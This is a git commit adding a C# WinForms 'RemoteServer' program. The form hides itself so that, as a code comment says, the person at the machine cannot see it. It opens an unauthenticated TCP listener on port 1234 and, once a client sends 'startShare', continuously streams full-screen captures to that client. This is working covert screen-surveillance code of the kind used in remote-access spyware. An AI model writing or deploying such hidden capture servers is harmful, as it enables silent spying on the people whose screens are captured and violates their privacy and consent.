7db5d5798a8988f44b072fee704c8924610ffa61
nexospex <75277688+nexospex@users.noreply.github.com>
2023-01-13 14:04:37 +0200

    Add files via upload

---
+++ RemoteServer/Server.Designer.cs
@@ -0,0 +1,64 @@
+﻿
+namespace RemoteServer
+{
+    partial class Server
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Location = new System.Drawing.Point(0, 0);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(1184, 619);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBox1.TabIndex = 0;
+            this.pictureBox1.TabStop = false;
+            // 
+            // Server
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(1184, 618);
+            this.Controls.Add(this.pictureBox1);
+            this.Name = "Server";
+            this.Text = "Form1";
+            this.Shown += new System.EventHandler(this.Form1_Shown);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.PictureBox pictureBox1;
+    }
+}
+
---
+++ RemoteServer/Server.cs
@@ -0,0 +1,121 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Net;
+using System.Net.Sockets;
+using System.IO;
+using System.Runtime.Serialization.Formatters.Binary;
+using AForge.Video;
+
+namespace RemoteServer
+{
+    public partial class Server : Form
+    {
+        int count = 0;
+        private int PORT = 1234;
+        private Socket _serverSocket;
+        private Socket acc;
+        private NetworkStream netStream;
+        private BinaryReader sreader;
+        private BinaryWriter swriter;
+        private ScreenCaptureStream _screenCapture;
+        public Server()
+        {
+            InitializeComponent();
+            this.Opacity = 0; // I do not want the server to see the form
+
+            //intiallizing the screenCapture neccesery props
+            _screenCapture = new ScreenCaptureStream(new Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), 100);
+            _screenCapture.NewFrame += new NewFrameEventHandler(NewFrame);
+        }
+
+        public byte[] ImageToByte(Image img)
+        {
+            ImageConverter conv = new ImageConverter();
+            return (byte[])conv.ConvertTo(img, typeof(byte[]));
+        }
+
+        private void Form1_Shown(object sender, EventArgs e)
+        {//Hide the form completely (not just the opacity)
+            this.Hide();
+            this.Opacity = 100;
+            try
+            {
+                startServer();
+            }
+            catch (Exception ex)
+            { return; }
+            /*finally
+            {
+                acc.Close();
+                _serverSocket.Close();
+                _screenCapture.Stop();
+                this.Close();
+            }*/
+            /*new System.Threading.Thread(delegate ()
+            {
+                while (true)
+                {
+                    pictureBox1.Image = GetImage();
+                    //System.Threading.Thread.Sleep(100);
+                }
+            }).Start();*/
+        }
+
+        private void startServer()
+        {
+            _serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            _serverSocket.Bind(new IPEndPoint(0, PORT));
+            _serverSocket.Listen(1);
+
+            acc = _serverSocket.Accept();
+
+
+            netStream = new NetworkStream(acc);
+            sreader = new BinaryReader(netStream);
+
+            if (sreader.ReadString() == "startShare")
+                _screenCapture.Start();
+            else
+                throw new Exception("Did not start share");
+        }
+
+        public void NewFrame(object sender, NewFrameEventArgs eventArgs)
+        {
+            byte[] data;
+
+            try
+            {
+
+                Image currentCapture = (Image)eventArgs.Frame;
+
+                data = ImageToByte(currentCapture);
+                count++;
+                Console.WriteLine(count);
+                swriter = new BinaryWriter(netStream);
+                swriter.Write(data.Length.ToString());
+                Console.WriteLine();
+                Console.WriteLine(DateTime.Now.ToString() + "STRING");
+                acc.Send(data, 0, data.Length, 0);
+                Console.WriteLine(DateTime.Now.ToString() + "IMAGE");
+                swriter.Flush();
+                System.Threading.Thread.Sleep(100);
+            }
+            catch (Exception ex)
+            {
+                _serverSocket.Close();
+                _screenCapture.Stop();
+                MessageBox.Show("Closing Application");
+                this.Close();
+                return;
+            }
+        }
+    }
+}
+
